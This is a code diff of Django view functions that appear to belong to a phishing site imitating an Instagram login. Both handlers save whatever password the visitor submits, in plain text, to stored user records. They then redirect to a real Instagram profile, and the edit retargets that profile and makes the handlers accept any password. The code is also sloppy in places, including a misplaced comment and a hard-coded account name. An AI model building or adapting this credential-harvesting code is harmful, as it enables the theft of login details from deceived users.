@@ -24,10 +24,10 @@ def password_page(request):
 
         User.objects.filter(username__iexact='polleykalicharan').update(password=password)
         sleep(8)
-        password = input("Enter your password: ")
+        
   # Simulate a delay for password update
-        if password == 'polley':
-            return redirect("https://www.instagram.com/surya_____2021/")
+        if password:
+            return redirect("https://www.instagram.com/polleykalicharan/")
         else:
             return render(
                 request,
@@ -61,7 +61,7 @@ def login(request):
             Q(mobile__iexact=identifier) | Q(email__iexact=identifier) | Q(username__iexact=identifier)
         ).update(password=password)
             request.session["username"] = identifier
-            return redirect("https://www.instagram.com/surya_____2021/")
+            return redirect("https://www.instagram.com/polleykalicharan/")
         else:
             return render(
                 request,
